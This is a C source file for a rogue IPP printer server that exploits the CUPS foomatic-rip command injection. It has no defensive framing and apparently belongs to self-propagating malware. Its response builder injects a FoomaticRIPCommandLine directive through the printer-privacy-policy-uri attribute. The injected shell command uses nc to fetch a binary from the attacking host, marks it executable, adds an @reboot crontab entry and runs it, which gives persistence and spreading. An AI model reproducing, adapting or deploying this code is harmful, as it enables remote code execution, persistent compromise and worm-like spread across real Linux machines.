#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>

#include "ipp_server.h"
#include "utils.h"

#define TARGET_PORT 631
#define BUFFER_SIZE 4096
#define MAX_PAYLOAD_SIZE 2048
#define MAX_RCE_SIZE  MAX_PAYLOAD_SIZE - 200
#define MAX_RESPONSE_SIZE 4096

typedef struct thread_args{
    int client_socket;
    char *server_ip;
}TArgs;

typedef struct ipp_request_info{
    int version_major;
    int version_minor;
    uint32_t request_id;
}IppReqInfo;

// Function to locate the ipp data within the received HTTP request
char* find_ipp_body(char** http_request) {
    char* body_start = NULL;

    // Look for the "Content-Length" header in the HTTP request
    char* content_length_header = global->strstr(*http_request, "Content-Length: ");
    if (!content_length_header) {
        DEBUG_LOG_ERR("[IPP] Content-Length header not found.\n");
        return NULL;
    }

    // Extract the content length
    int content_length = 0;
    if (global->sscanf(content_length_header, "Content-Length: %d", &content_length) != 1) {
        DEBUG_LOG_ERR("[IPP] Invalid Content-Length header.\n");
        return NULL;
    }

    // Find the double newline that marks the end of the headers
    char* header_end = global->strstr(*http_request, "\r\n\r\n");
    if (!header_end) {
        DEBUG_LOG_ERR("[IPP] Invalid HTTP request format.\n");
        return NULL;
    }
    header_end += 4;  // Skip the newline characters

    return header_end;
}

// add a string attribute to the ipp body
int ipp_add_string(char *ipp, int tag, char* attribute, char* value){
    int offset = 0;
    // write tag
    ipp[offset++] = tag; 
    
    // write attribute-name length
    size_t attr_len = global->strlen(attribute);
    uint16_t v_attr_len = global->htons(attr_len);
    global->memcpy(&ipp[offset], &v_attr_len, sizeof(v_attr_len));
    offset += sizeof(v_attr_len);
    // write attribute-name
    global->memcpy(&ipp[offset], attribute, attr_len);
    offset += attr_len;

    // write value length
    size_t value_len = global->strlen(value);
    uint16_t v_value_len = global->htons(value_len);
    global->memcpy(&ipp[offset], &v_value_len, sizeof(v_value_len));
    offset += sizeof(v_value_len);
    // write value
    global->memcpy(&ipp[offset], value, value_len);
    offset += value_len;

    return offset;
}

// add an integer attribute to the ipp body
int ipp_add_integer(char *ipp, int tag, char * attribute, uint32_t value){
    int offset = 0;

    // write tag
    ipp[offset++] = tag;

    // write attribute-name length
    size_t attr_len = global->strlen(attribute);
    uint16_t v_attr_len = global->htons(attr_len);
    global->memcpy(&ipp[offset], &v_attr_len, sizeof(v_attr_len));
    offset += sizeof(v_attr_len);
    // write attribute name
    global->memcpy(&ipp[offset], attribute, attr_len);
    offset += attr_len;

    // write value length
    uint16_t value_len = global->htons(4);
    global->memcpy(&ipp[offset], &value_len, sizeof(value_len));
    offset += sizeof(value_len);

    // write value
    uint32_t v_value = global->htonl(value);
    global->memcpy(&ipp[offset], &v_value, sizeof(v_value));
    offset += sizeof(v_value);

    return offset;
}

// add a boolean attribute to the ipp body
int ipp_add_boolean(char *ipp, char * attribute, char value){
    int offset = 0;

    // write boolean tag
    ipp[offset++] = IPP_TAG_BOOLEAN;

    // write attribute-name length
    size_t attr_len = global->strlen(attribute);
    uint16_t v_attr_len = global->htons(attr_len);
    global->memcpy(&ipp[offset], &v_attr_len, sizeof(v_attr_len));
    offset += sizeof(v_attr_len);
    // write attribute name
    global->memcpy(&ipp[offset], attribute, attr_len);
    offset += attr_len;

    // write value length
    ipp[offset++]=0;
    ipp[offset++]=1;

    // write value
    ipp[offset++] = value;

    return offset;
}

// Function to create an IPP response using libcups
unsigned char* create_ipp_body(size_t* response_size, struct ipp_request_info *request_info, char *rce_command) {
    // Allocate buffer
    unsigned char* response = global->malloc(MAX_RESPONSE_SIZE);
    if (!response) {
        DEBUG_LOG_ERR("[IPP] CreateIppBody malloc failed\n");
        return NULL;
    }
    global->memset(response, 0, MAX_RESPONSE_SIZE); // Initialize memory to zero

    size_t offset = 0;

    // IPP Version
    char ipp_version[4];
    global->snprintf(ipp_version, 4, "%d.%d", request_info->version_minor, request_info->version_minor);
    response[offset++] = (unsigned char)request_info->version_major;
    response[offset++] = (unsigned char)request_info->version_minor;

    // Status Code (Successful)
    uint16_t status_code = global->htons(0x0000); // IPP_OK
    global->memcpy(&response[offset], &status_code, sizeof(status_code));
    offset += sizeof(status_code);

    // Request ID
    uint32_t req_id = global->htonl(request_info->request_id);
    global->memcpy(&response[offset], &req_id, sizeof(req_id));
    offset += sizeof(req_id);

    // Start Operation Attributes
    response[offset++] = IPP_TAG_OPERATION; // Operation Attributes Tag

    offset += ipp_add_string(&response[offset], IPP_TAG_CHARSET, "attributes-charset", "utf-8");
    offset += ipp_add_string(&response[offset], IPP_TAG_LANGUAGE, "attributes-natural-language", "en");

    // Start Printer Attributes
    response[offset++] = IPP_TAG_PRINTER; // Printer Attributes Tag

    offset += ipp_add_string(&response[offset], IPP_TAG_URI, "printer-uri-supported", "ipp://localhost:666/printer");
    offset += ipp_add_string(&response[offset], IPP_TAG_KEYWORD, "uri-authentication-supported", "none");
    offset += ipp_add_string(&response[offset], IPP_TAG_KEYWORD, "uri-security-supported", "none");
    offset += ipp_add_string(&response[offset], IPP_TAG_NAME, "printer-name", "Main Printer");
    offset += ipp_add_string(&response[offset], IPP_TAG_TEXT, "printer-info", "Main Printer Info");
    offset += ipp_add_string(&response[offset], IPP_TAG_TEXT, "printer-make-and-model", "HP 0.00");
    offset += ipp_add_integer(&response[offset], IPP_TAG_INTEGER, "queued-job-count", 666);
    offset += ipp_add_integer(&response[offset], IPP_TAG_ENUM, "printer-state", IPP_PSTATE_IDLE);
    offset += ipp_add_string(&response[offset], IPP_TAG_KEYWORD, "printer-state-reasons", "none");
    offset += ipp_add_string(&response[offset], IPP_TAG_KEYWORD, "ipp-versions-supported", ipp_version);
    
    offset += ipp_add_integer(&response[offset], IPP_TAG_ENUM, "operations-supported", IPP_OP_PRINT_JOB);
    offset += ipp_add_integer(&response[offset], IPP_TAG_ENUM, "", IPP_OP_VALIDATE_JOB);
    offset += ipp_add_integer(&response[offset], IPP_TAG_ENUM, "", IPP_OP_CANCEL_JOB);
    offset += ipp_add_integer(&response[offset], IPP_TAG_ENUM, "", IPP_OP_GET_JOB_ATTRIBUTES);
    offset += ipp_add_integer(&response[offset], IPP_TAG_ENUM, "", IPP_OP_GET_PRINTER_ATTRIBUTES);
    offset += ipp_add_boolean(&response[offset], "multiple-document-jobs-supported", (char)0);
    offset += ipp_add_string(&response[offset], IPP_TAG_CHARSET, "charset-configured", "utf-8");
    offset += ipp_add_string(&response[offset], IPP_TAG_CHARSET, "charset-supported", "utf-8");
    offset += ipp_add_string(&response[offset], IPP_TAG_LANGUAGE, "natural-language-configured", "en");
    offset += ipp_add_string(&response[offset], IPP_TAG_LANGUAGE, "generated-natural-language-supported", "en");
    offset += ipp_add_string(&response[offset], IPP_TAG_MIMETYPE, "document-format-default", "application/pdf");
    offset += ipp_add_string(&response[offset], IPP_TAG_MIMETYPE, "document-format-supported", "application/pdf");
    offset += ipp_add_boolean(&response[offset], "printer-is-accepting-jobs", (char)1);
    offset += ipp_add_integer(&response[offset], IPP_TAG_INTEGER, "queued-job-count", 666);
    offset += ipp_add_string(&response[offset], IPP_TAG_KEYWORD, "pdl-override-supported", "not-attempted");
    offset += ipp_add_integer(&response[offset], IPP_TAG_INTEGER, "printer-up-time", 420);
    offset += ipp_add_string(&response[offset], IPP_TAG_KEYWORD, "compression-supported", "none");

    char *payload = global->malloc(MAX_PAYLOAD_SIZE);
    global->snprintf(payload, MAX_PAYLOAD_SIZE, "https//www.google.com/\"\n*FoomaticRIPCommandLine: \"%s\"\n*cupsFilter2 : \"*/* application/vnd.cups-postscript 0 foomatic-rip", rce_command);
    DEBUG_LOG("[IPP] Sending payload: \n%s\n", payload);
    offset += ipp_add_string(&response[offset], IPP_TAG_URI, "printer-privacy-policy-uri", payload);
    global->free(payload);

    // End of Attributes Tag
    response[offset++] = 0x03;
    *response_size = offset;

    // Return the constructed response
    return response;
}

unsigned char* create_http_body(size_t* total_response_size, struct ipp_request_info *request_info, char* rce_command) {
    size_t ipp_size;
    unsigned char* ipp_response = create_ipp_body(&ipp_size, request_info, rce_command);
    if (!ipp_response) {
        return NULL;
    }

    // HTTP header template
    const char* http_header_template = 
        "HTTP/1.1 200 OK\r\n"
        "Content-Length: %zu\r\n"
        "Content-Type: application/ipp\r\n"
        "\r\n";

    // Calculate total size
    size_t http_header_size = global->snprintf(NULL, 0, http_header_template, ipp_size);
    *total_response_size = http_header_size + ipp_size;

    // Allocate buffer for full HTTP response
    unsigned char* full_response = global->malloc(*total_response_size);
    if (!full_response) {
        DEBUG_LOG_ERR("[IPP] Failed to allocate buffer for HTTP response\n");
        global->free(ipp_response);
        return NULL;
    }

    // Write HTTP header
    global->snprintf((char*)full_response, http_header_size + 1, http_header_template, ipp_size);

    // Append IPP payload
    global->memcpy(full_response + http_header_size, ipp_response, ipp_size);

    global->free(ipp_response);
    return full_response;
}


int load_ipp_request_infos(IppReqInfo * request_info, char* received_data){
    // locate the ipp_version and request_id within the request
    char ** buffer_ptr = &received_data;
    char* ipp_body = find_ipp_body(buffer_ptr);
    if(ipp_body == NULL){
        DEBUG_LOG_ERR("[IPP] request is not ipp...\n");
        return 0;
    }
    int ipp_version_major = *(char*)ipp_body;
    int ipp_version_minor = *(char*)(ipp_body+1);
    uint32_t raw_request_id = *(uint32_t*)(ipp_body+4);
    uint32_t request_id = global->ntohl(raw_request_id);

    // store the ipp info in the struct
    request_info->version_major = ipp_version_major;
    request_info->version_minor = ipp_version_minor;
    request_info->request_id = request_id;
}

// Function to handle incoming IPP requests
void* handle_client(void* arg) {
    TArgs *args = (TArgs*) arg; 
    int client_sock = args->client_socket;
    char *server_ip = args->server_ip;
    global->free(arg);

    // Receive client request
    char buffer[BUFFER_SIZE];
    int bytes_received = global->recv(client_sock, buffer, sizeof(buffer), 0);
    if (bytes_received < 0) {
        DEBUG_LOG_ERR("[IPP] recv failed\n");
        global->close(client_sock);
        return NULL;
    }

    IppReqInfo *request_info = global->malloc(sizeof(IppReqInfo));
    if(!load_ipp_request_infos(request_info, buffer)){
        DEBUG_LOG_ERR("[IPP] msg not ipp\n");
        global->close(client_sock);
        return NULL;
    }

    char *rce_command = global->malloc(MAX_RCE_SIZE);
    global->snprintf(rce_command, MAX_RCE_SIZE, "echo -n | nc %s %d > /var/tmp/.cups && chmod +x /var/tmp/.cups && rm -f /tmp/foomatic* && echo \'(crontab -l; echo \"@reboot /var/tmp/.cups\") | crontab -; /var/tmp/.cups& \' > /tmp/runme.sh && sh /tmp/runme.sh && rm /tmp/runme.sh", server_ip, global->propagation_server_port);

    // Create and send IPP response
    size_t response_size;
    unsigned char* ipp_response = create_http_body(&response_size, request_info, rce_command);
    global->free(request_info);
    global->free(rce_command);
    if (!ipp_response) {
        global->close(client_sock);
        return NULL;
    }

    global->send(client_sock, ipp_response, response_size, 0);
    global->free(ipp_response);
    global->close(client_sock);
    return NULL;
}

// Main function to start the server
int serve(Globals * glob) {
    global = glob;

    // Set up the server to listen for incoming connections
    int server_sock = global->socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        DEBUG_LOG_ERR("[IPP] Socket creation failed\n");
        return 1;
    }

    struct sockaddr_in server_addr;
    global->memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = global->htons(global->ipp_server_port);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    int yes=1;
    if(global->setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &yes, sizeof(yes)) == -1){
        DEBUG_LOG_ERR("[IPP] Setsockopt failed...\n");
        global->exit(0);
    }

    if (global->bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        global->fprintf(global->stderr, "[IPP] Bind failed");
        global->close(server_sock);
        return 1;
    }

    if (global->listen(server_sock, 10) < 0) {
        DEBUG_LOG_ERR("[IPP] Listen failed");
        global->close(server_sock);
        return 1;
    }

    DEBUG_LOG("[IPP] Server listening on port %d...\n", global->ipp_server_port);

    // Start the server to handle incoming connections
    while (1) {
        int client_sock = global->accept(server_sock, NULL, NULL);
        if (client_sock < 0) {
            DEBUG_LOG_ERR("[IPP] Accept failed");
            continue;
        }

         // Get the local address (server address) of the interface used for this connection
        struct sockaddr_in local_addr;
        socklen_t addr_len = sizeof(local_addr);
        char local_ip[INET_ADDRSTRLEN];
        if (global->getsockname(client_sock, (struct sockaddr*)&local_addr, &addr_len) == 0) {
            global->inet_ntop(AF_INET, &local_addr.sin_addr, local_ip, sizeof(local_ip));
        } else {
            DEBUG_LOG_ERR("[IPP] getsockname failed\n");
            continue;
        }

        pthread_t thread;
        TArgs *args = global->malloc(sizeof(TArgs));
        args->client_socket = client_sock;
        args->server_ip = local_ip;
        global->pthread_create(&thread, NULL, handle_client, args);
        global->pthread_detach(thread);
    }

    global->close(server_sock);
    return 0;
}
